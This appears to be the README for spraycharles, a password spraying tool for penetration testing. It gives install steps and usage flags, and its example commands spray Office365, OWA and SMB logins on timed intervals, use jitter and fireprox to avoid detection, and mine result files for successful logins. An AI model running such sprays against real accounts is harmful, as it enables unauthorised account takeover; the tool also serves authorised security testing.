spraycharles
======
## Overview ##
Low and slow password spraying tool, designed to spray on an interval over a long period of time.

## Install

### Using pipenv
```bash
git clone https://github.com/Tw1sm/spraycharles.git && cd spraycharles
pipenv --python 3 shell
pip3 install -r requirements.txt
./spraycharles.py -h
```

### Using Docker
Build the container using the included Dockerfile.

```bash
git clone https://github.com/Tw1sm/spraycharles.git && cd spraycharles
docker build . -t spraycharles
```

You will most likely want to save and use a list of usernames and passwords during spraying. The easiest way to do this is by mapping a directory on your host with the container. Use the following command in Bash to map your present workign directory to the spraycharles install directory inside the running container.

```bash
docker run -it -v $(pwd):/spraycharles/ spraycharles -h
```

Following your first run of the command above, a sparycharles directory will be created on your system where you can add username and password lists as well as access spraying logs. 


### From GitHub
```bash
$ git clone https://github.com/Tw1sm/spraycharles.git
$ cd spraycharles
$ pip3 install -r requirements.txt
$ ./spraycharles.py -h
```

## Usage ##
```
usage: spraycharles.py [-h] -p PASSLIST [-H HOST] -m MODULE [-o CSVFILE] -u
                       USERLIST [-a ATTEMPTS] [-i INTERVAL] [-e] [-t TIMEOUT]
                       [-b PORT] [-f FIREPROX] [-d DOMAIN]

optional arguments:
  -h, --help            show this help message and exit
  -p PASSLIST, --passwords PASSLIST
                        filepath of the passwords list or a single password to
                        spray
  -H HOST, --host HOST  host to password spray (ip or hostname). Can by
                        anything when using Office365 module - only used for
                        logfile name.
  -m MODULE, --module MODULE
                        module corresponding to target host
  -o CSVFILE, --output CSVFILE
                        name and path of output csv where attempts will be
                        logged
  -u USERLIST, --usernames USERLIST
                        filepath of the usernames list
  -a ATTEMPTS, --attempts ATTEMPTS
                        number of logins submissions per interval (for each
                        user)
  -i INTERVAL, --interval INTERVAL
                        minutes inbetween login intervals
  -e, --equal           does 1 spray for each user where password = username
  -t TIMEOUT, --timeout TIMEOUT
                        web request timeout threshold. default is 5 seconds
  -b PORT, --port PORT  port to connect to on the specified host. Default 443.
  -f FIREPROX, --fireprox FIREPROX
                        the url of the fireprox interface, if you are using
                        fireprox.
  -d DOMAIN, --domain DOMAIN
                        HTTP: Prepend DOMAIN\ to usernames. SMB: Specify
                        domain for smb connection
  --jitter JITTER         Jitter time between requests in seconds.
  --jitter-min JITTER-MIN Minimum time between requests in seconds.
   

```
### Examples ###
Basic usage (Office365)
```
./spraycharles.py -u users.txt -p passwords.txt -m Office365
```
Basic usage (non-Office365) with a single password, supplied via command line
```
./spraycharles.py -u users.txt -H webmail.company.com -p Password123 -m owa
```
Attempt 5 logins per user every 20 minutes
```
./spraycharles.py -n users.txt -H webmail.company.com -p passwords.txt -i 20 -a 5 -m owa
```
Usage with fireprox (Office365)
```
./spraycharles.py -u users.txt -p passwords.txt -m office365 -f abcdefg.execute-api.us-east-1.amazonawms.com
```
Spray host over SMB with 2 attempts per user every hour
```
./spraycharles.py -u users.txt -p passwords.txt -m Smb -H 10.10.1.5 -a 2 -i 60
```

### Generating Custom Spray Lists ###
make_list.py will generate a password list based off the specifications provided in list_elements.json
```
./make_list.py
```

### Analyzing the results CSV file ###
`analyze.py` can read your output CSV and determine response lengths that are statistically relevant. With enough data, it should be able to pull successful logins out of your CSV file. This is not the only way to determine successful logins, depending on your target site, and I would still recommend checking the data yourself to be sure nothing is missed. For SMB, it will simply find entries that contain "SUCCESS"
```
./analyze.py myresults.csv
```


## Disclaimer ##
This tool is designed for use during penetration testing; usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse of this program.
